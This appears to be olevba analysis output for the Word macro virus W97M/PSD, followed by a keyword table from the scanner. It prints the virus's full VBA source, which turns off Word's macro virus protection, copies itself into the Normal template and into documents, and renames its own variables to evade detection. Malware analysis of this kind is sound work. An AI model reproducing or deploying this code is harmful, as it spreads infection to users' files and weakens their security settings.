olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-fbf33279e484f37981f2f8037addf7ad9b9cb4d6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-fbf33279e484f37981f2f8037addf7ad9b9cb4d6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For JR9718 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next JR9718: End If
PM5921 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
TD7717 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set NM3149 = ActiveDocument.VBProject.VBComponents.Item(1)
QQ8742 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set NM3149 = NormalTemplate.VBProject.VBComponents.Item(1)
JD6552 = True
Call BL2410_UJ9681
ActiveDocument.Saved = True
End If
If JD6552 <> True And QQ8742 <> True Then GoTo JC9420
If JD6552 = True Then NM3149.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, PM5921 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If QQ8742 = True Then NM3149.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TD7717 - 4))
JC9420:
If TD7717 <> 0 And PM5921 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function BL2410_UJ9681()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "RT6361": r1(2) = "TI1170": r1(3) = "GJ5296": r1(4) = "FK7653": r1(5) = "UJ9681": r1(6) = "PM5921"
r1(7) = "TD7717": r1(8) = "QQ8742":: r1(9) = "NM3149": r1(10) = "JD6552": r1(11) = "JC9420": r1(12) = "BL2410": r1(13) = "DA5316": r1(14) = "LO7044": r1(15) = "JR9718"
For JR9718 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call UJ9681(a1, r1(JR9718))
Next JR9718
End Function 'VAMP v1.0 [thanks Vic!]
Private Function UJ9681(LO7044, DA5316 As String)
On Error Resume Next
Dim RT6361 As Long: Dim TI1170 As Long: Dim GJ5296 As Long: Dim FK7653 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
RT6361 = 1: TI1170 = 1: GJ5296 = .CountOfLines: FK7653 = Len(.Lines(.CountOfLines, 1))
Do While .Find(DA5316, RT6361, TI1170, GJ5296, FK7653, True)
strline = .Lines(RT6361, 1)
strline = Left(strline, TI1170 - 1) & LO7044 & Mid(strline, FK7653)
.replaceline RT6361, strline
RT6361 = GJ5296 + 1: TI1170 = 1:
GJ5296 = .CountOfLines
FK7653 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

